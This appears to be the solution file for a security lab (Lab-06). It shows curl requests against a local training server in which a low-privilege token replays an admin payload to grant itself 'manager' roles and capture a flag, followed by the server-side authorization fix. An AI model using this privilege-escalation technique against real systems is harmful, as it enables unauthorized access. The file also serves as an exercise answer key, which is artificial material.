# SOLUTION — Lab-06

```bash
# 1) observe both flows
curl -X POST http://127.0.0.1:8006/api/v1/companyjoinrequests \
 -H "Authorization: Bearer internal-token" -H "Content-Type: application/json" \
 -d '{"identifier":{"providerId":"email","providerUserId":"x@x.com"},"companyId":"12345"}'

# 2) replay the admin payload with the LOW-PRIV token
curl -X POST http://127.0.0.1:8006/api/v1/contacts \
 -H "Authorization: Bearer internal-token" -H "Content-Type: application/json" \
 -d '{"identifiers":[{"providerId":"email","providerUserId":"evil@lab.local"}],"companyUserRoles":["user","manager"],"contactId":null,"contactType":"company"}'
# -> 201 + FLAG{...}
```

**Fix:** `if not current_user.can_assign(requested_roles): return 403` — server-side, on every request.
